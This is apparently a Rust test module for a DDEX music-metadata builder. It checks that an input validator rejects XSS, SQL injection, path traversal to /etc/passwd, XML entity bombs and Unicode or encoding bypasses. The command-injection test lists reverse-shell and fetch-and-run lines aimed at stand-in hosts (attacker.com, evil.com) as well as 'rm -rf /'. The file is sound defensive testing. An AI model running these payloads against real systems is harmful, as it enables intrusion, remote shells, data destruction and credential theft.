//! Malicious Payload Tests for DDEX Builder
//!
//! This module tests various malicious payloads in both parsing and building operations:
//! - XML injection in DDEX fields
//! - Script injection attempts
//! - SQL injection in metadata
//! - Path traversal in file references
//! - Command injection in processing instructions
//! - CDATA section abuse
//! - Encoding manipulation attacks
//! - Unicode normalization attacks
//! - XML bomb variations in DDEX context

use ddex_builder::{
    builder::DDEXBuilder,
    error::BuildError,
    security::{InputValidator, SecurityConfig},
};
use serde_json::json;

/// Test XML injection in DDEX metadata fields
#[test]
fn test_xml_injection_in_ddex_fields() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // XML injection in title field
    let xml_injection_title = r#"<ddex:NewReleaseMessage>
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReferenceTitle>
                    <ddex:TitleText>Test Song]]></ddex:TitleText><ddex:Injected>malicious content</ddex:Injected><ddex:TitleText><![CDATA[</ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    let result = validator.validate_xml_content(xml_injection_title);
    // This might pass initial validation but should be caught by the builder's content validation

    // XML injection in artist name
    let xml_injection_artist = r#"<ddex:NewReleaseMessage>
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReleaseResourceReferenceList>
                    <ddex:ReleaseResourceReference>
                        <ddex:DisplayArtist>
                            <ddex:PartyName>Artist Name</script><script>alert('XSS')</script><![CDATA[</ddex:PartyName>
                        </ddex:DisplayArtist>
                    </ddex:ReleaseResourceReference>
                </ddex:ReleaseResourceReferenceList>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    let result = validator.validate_xml_content(xml_injection_artist);
    // Should detect script injection patterns

    // Test through JSON input as well
    let malicious_json = json!({
        "messageHeader": {
            "messageId": "MSG001",
            "messageThreadId": "THREAD001"
        },
        "releases": [{
            "title": "Test Song<script>alert('xss')</script>",
            "artists": ["Artist</artist><malicious>injection</malicious><artist>"]
        }]
    });

    let builder = DDEXBuilder::new();
    let result = builder.validate_json_input(&malicious_json.to_string());
    assert!(
        result.is_err(),
        "JSON with XML injection should be rejected: {:?}",
        result
    );
}

/// Test script injection attempts in various DDEX fields
#[test]
fn test_script_injection_attempts() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    let script_payloads = vec![
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
    ];

    for payload in script_payloads {
        // Test in various DDEX field contexts
        let test_fields = vec![
            ("TitleText", format!("<ddex:TitleText>{}</ddex:TitleText>", payload)),
            ("PartyName", format!("<ddex:PartyName>{}</ddex:PartyName>", payload)),
            ("LabelName", format!("<ddex:LabelName>{}</ddex:LabelName>", payload)),
            ("Comment", format!("<ddex:Comment>{}</ddex:Comment>", payload)),
        ];

        for (field_name, xml_content) in test_fields {
            let full_xml = format!(r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">{}</ddex:NewReleaseMessage>"#, xml_content);
            
            let result = validator.validate_xml_content(&full_xml);
            
            // Check if detected as dangerous content
            match result {
                Err(BuildError::Security(msg)) | Err(BuildError::InputSanitization(msg)) => {
                    assert!(
                        msg.contains("injection") || msg.contains("script") || msg.contains("dangerous"),
                        "Script injection not properly detected in {} field: {}",
                        field_name, msg
                    );
                }
                Ok(_) => {
                    // If it passes XML validation, test string validation
                    let string_result = validator.validate_string(payload, field_name);
                    assert!(
                        string_result.is_err(),
                        "Script injection should be detected in string validation for {} field: {:?}",
                        field_name, payload
                    );
                }
                Err(e) => {
                    // Other errors are also acceptable as they indicate rejection
                    println!("Payload rejected with error for {}: {:?}", field_name, e);
                }
            }
        }
    }
}

/// Test SQL injection in metadata fields
#[test]
fn test_sql_injection_in_metadata() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    let sql_payloads = vec![
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM passwords --",
        "'; INSERT INTO logs VALUES ('hacked'); --",
        "' OR 1=1 --",
        "admin'--",
        "admin'/*",
        "1' OR '1'='1",
        "'; EXEC xp_cmdshell('dir'); --",
        "1' AND 1=1 --",
        "' OR 'a'='a",
        "') OR '1'='1 --",
        "' waitfor delay '00:00:10' --",
    ];

    for payload in sql_payloads {
        // Test in various DDEX metadata contexts
        let result = validator.validate_string(payload, "metadata_field");
        assert!(
            result.is_err(),
            "SQL injection payload should be detected: {:?}",
            payload
        );

        // Test in JSON context
        let malicious_json = json!({
            "messageHeader": {
                "messageId": payload,
                "messageThreadId": "THREAD001"
            },
            "releases": [{
                "title": payload,
                "isrc": payload
            }]
        });

        let builder = DDEXBuilder::new();
        let result = builder.validate_json_input(&malicious_json.to_string());
        assert!(
            result.is_err(),
            "SQL injection in JSON should be rejected: {:?}",
            payload
        );
    }
}

/// Test path traversal attempts in file references
#[test]
fn test_path_traversal_attacks() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    let path_traversal_payloads = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....\\....\\....\\etc\\passwd",
        "..//////..//////etc/passwd",
        "....\\/....\\/....\\/etc/passwd",
        "/etc/passwd%00.txt",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "/proc/self/environ",
        "/dev/null",
    ];

    for payload in path_traversal_payloads {
        // Test path validation
        let result = validator.validate_path(payload);
        assert!(
            result.is_err(),
            "Path traversal should be detected: {:?}",
            payload
        );

        // Test in string validation context
        let result = validator.validate_string(payload, "file_path");
        // This may or may not fail depending on string validation rules

        // Test in DDEX XML with file references
        let xml_with_path = format!(r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
            <ddex:ResourceList>
                <ddex:SoundRecording>
                    <ddex:TechnicalSoundRecordingDetails>
                        <ddex:File>{}</ddex:File>
                    </ddex:TechnicalSoundRecordingDetails>
                </ddex:SoundRecording>
            </ddex:ResourceList>
        </ddex:NewReleaseMessage>"#, payload);

        // This should be caught by content validation if not by XML validation
        let _ = validator.validate_xml_content(&xml_with_path);
    }
}

/// Test command injection in processing instructions
#[test]
fn test_command_injection_attempts() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    let command_payloads = vec![
        "; cat /etc/passwd;",
        "| whoami",
        "& dir &",
        "`id`",
        "$(whoami)",
        "|| ls -la",
        "&& echo 'hacked'",
        "; rm -rf / ;",
        "| nc attacker.com 4444 -e /bin/sh",
        "; wget http://evil.com/malware.sh | bash;",
        "$(curl evil.com/payload)",
        "`wget -O - evil.com/script | sh`",
    ];

    for payload in command_payloads {
        // Test string validation
        let result = validator.validate_string(payload, "command_field");
        // May or may not be caught by string validation

        // Test in XML processing instruction
        let xml_with_pi = format!(r#"<?xml version="1.0"?>
        <?command {}?>
        <ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
            <ddex:MessageHeader>
                <ddex:MessageId>TEST</ddex:MessageId>
            </ddex:MessageHeader>
        </ddex:NewReleaseMessage>"#, payload);

        let result = validator.validate_xml_content(&xml_with_pi);
        // Processing instructions with dangerous content should be handled carefully
    }
}

/// Test CDATA section abuse
#[test]
fn test_cdata_section_abuse() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // CDATA with script content
    let cdata_script = r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReferenceTitle>
                    <ddex:TitleText><![CDATA[<script>alert('XSS in CDATA')</script>]]></ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    let result = validator.validate_xml_content(cdata_script);
    // CDATA should be parsed but content should be validated

    // CDATA with SQL injection
    let cdata_sql = r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReferenceTitle>
                    <ddex:TitleText><![CDATA['; DROP TABLE albums; --]]></ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    let result = validator.validate_xml_content(cdata_sql);
    
    // Nested CDATA attempt (invalid but worth testing)
    let nested_cdata = r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReferenceTitle>
                    <ddex:TitleText><![CDATA[Normal content <![CDATA[nested]]> more content]]></ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    let result = validator.validate_xml_content(nested_cdata);
    // Should be rejected as malformed

    // CDATA with malformed end
    let malformed_cdata = r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReferenceTitle>
                    <ddex:TitleText><![CDATA[Content without proper end</ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    let result = validator.validate_xml_content(malformed_cdata);
    assert!(result.is_err(), "Malformed CDATA should be rejected");
}

/// Test encoding manipulation attacks
#[test]
fn test_encoding_manipulation() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // URL-encoded malicious content
    let url_encoded = "%3Cscript%3Ealert('XSS')%3C/script%3E";
    let result = validator.validate_string(url_encoded, "encoded_field");

    // Double URL-encoded
    let double_encoded = "%253Cscript%253Ealert('XSS')%253C/script%253E";
    let result = validator.validate_string(double_encoded, "encoded_field");

    // HTML entity encoded script
    let html_encoded = "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;";
    let result = validator.validate_string(html_encoded, "html_field");

    // Mixed encoding
    let mixed_encoded = "%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E";
    let result = validator.validate_string(mixed_encoded, "mixed_field");

    // Unicode escape sequences
    let unicode_escaped = "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e";
    let result = validator.validate_string(unicode_escaped, "unicode_field");

    // Hex encoding
    let hex_encoded = "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E";
    let result = validator.validate_string(hex_encoded, "hex_field");

    // Base64 encoded payload
    let base64_payload = "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="; // <script>alert('XSS')</script>
    let result = validator.validate_string(base64_payload, "base64_field");
    // Should be caught by base64 pattern detection
    if result.is_ok() {
        // If string validation passes, decode and test
        if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(base64_payload) {
            if let Ok(decoded_str) = String::from_utf8(decoded) {
                let decoded_result = validator.validate_string(&decoded_str, "decoded_field");
                assert!(decoded_result.is_err(), "Decoded malicious content should be rejected");
            }
        }
    }
}

/// Test Unicode normalization attacks
#[test]
fn test_unicode_normalization_attacks() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Unicode normalization that could bypass filters
    let unicode_attacks = vec![
        // Different representations of '<script>'
        "\u{FF1C}script\u{FF1E}", // Fullwidth < and >
        "＜script＞", // Fullwidth characters
        "\u{2039}script\u{203A}", // Single-pointing angle quotation marks
        "‹script›", // Visual similarity
        
        // Homograph attacks
        "јаvascript", // Cyrillic lookalikes
        "ѕcript", // Cyrillic 's'
        
        // Zero-width characters
        "sc\u{200B}ript", // Zero-width space
        "scr\u{200C}ipt", // Zero-width non-joiner
        "scri\u{200D}pt", // Zero-width joiner
        "scrip\u{FEFF}t", // Zero-width no-break space
        
        // Combining characters
        "s\u{0300}cript", // Combining grave accent
        "sc\u{0301}ript", // Combining acute accent
        
        // Right-to-left override
        "\u{202E}tpircs", // RLO + "script" reversed
        
        // Alternative representations
        "script\u{0000}", // Null byte
        "script\u{0001}", // Start of heading
    ];

    for attack in unicode_attacks {
        let result = validator.validate_string(attack, "unicode_field");
        
        // Test in XML context
        let xml_content = format!(r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
            <ddex:ReleaseList>
                <ddex:Release>
                    <ddex:ReferenceTitle>
                        <ddex:TitleText>{}</ddex:TitleText>
                    </ddex:ReferenceTitle>
                </ddex:Release>
            </ddex:ReleaseList>
        </ddex:NewReleaseMessage>"#, attack);

        let xml_result = validator.validate_xml_content(&xml_content);
    }
}

/// Test XML bomb variations in DDEX context
#[test]
fn test_ddex_specific_xml_bombs() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Entity expansion in DDEX-specific elements
    let ddex_entity_bomb = r#"<!DOCTYPE ddex:NewReleaseMessage [
        <!ENTITY boom "BOOM! ">
        <!ENTITY boom2 "&boom;&boom;&boom;&boom;&boom;">
        <!ENTITY boom3 "&boom2;&boom2;&boom2;&boom2;&boom2;">
    ]>
    <ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReferenceTitle>
                    <ddex:TitleText>&boom3;</ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    let result = validator.validate_xml_content(ddex_entity_bomb);
    assert!(result.is_err(), "DDEX entity bomb should be blocked");

    // Large DDEX document structure abuse
    let mut large_ddex = String::from(r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:ReleaseList>"#);
    
    // Create many releases to exhaust memory
    for i in 0..1000 {
        large_ddex.push_str(&format!(r#"
            <ddex:Release>
                <ddex:ReleaseId>
                    <ddex:ISRC>TEST{:06}</ddex:ISRC>
                </ddex:ReleaseId>
                <ddex:ReferenceTitle>
                    <ddex:TitleText>Test Release {} with very long title text that repeats many times to create a large document structure that might cause memory exhaustion in XML parsers</ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>"#, i, i));
    }
    
    large_ddex.push_str(r#"
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#);

    let result = validator.validate_xml_content(&large_ddex);
    // Should be caught by size limits or element count limits

    // Deeply nested DDEX structure
    let mut deep_nested_ddex = String::from(r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">"#);
    
    // Create deep nesting
    for i in 0..50 {
        deep_nested_ddex.push_str(&format!("<ddex:Level{}>", i));
    }
    
    deep_nested_ddex.push_str("DEEP CONTENT");
    
    for i in (0..50).rev() {
        deep_nested_ddex.push_str(&format!("</ddex:Level{}>", i));
    }
    
    deep_nested_ddex.push_str("</ddex:NewReleaseMessage>");

    let result = validator.validate_xml_content(&deep_nested_ddex);
    // Should be caught by depth limits
}

/// Test malicious payloads in JSON to XML conversion
#[test]
fn test_malicious_json_to_xml_conversion() {
    let builder = DDEXBuilder::new();

    // JSON with XML injection that becomes dangerous when converted
    let malicious_json = json!({
        "messageHeader": {
            "messageId": "MSG001",
            "messageThreadId": "THREAD001"
        },
        "releases": [{
            "title": "<![CDATA[Safe content]]><script>alert('XSS')</script><![CDATA[]]>",
            "artists": ["Artist</ddex:PartyName><ddex:MaliciousElement>injected</ddex:MaliciousElement><ddex:PartyName>"],
            "isrc": "US123456789<!--comment--><injection>test</injection>"
        }]
    });

    let result = builder.validate_json_input(&malicious_json.to_string());
    assert!(
        result.is_err(),
        "Malicious JSON should be rejected before XML conversion: {:?}",
        result
    );

    // JSON with entity references
    let entity_json = json!({
        "messageHeader": {
            "messageId": "&xxe;",
            "messageThreadId": "THREAD&entity;"
        },
        "releases": [{
            "title": "&malicious_entity;",
            "artists": ["&script_injection;"]
        }]
    });

    let result = builder.validate_json_input(&entity_json.to_string());
    assert!(
        result.is_err(),
        "JSON with entity references should be rejected: {:?}",
        result
    );
}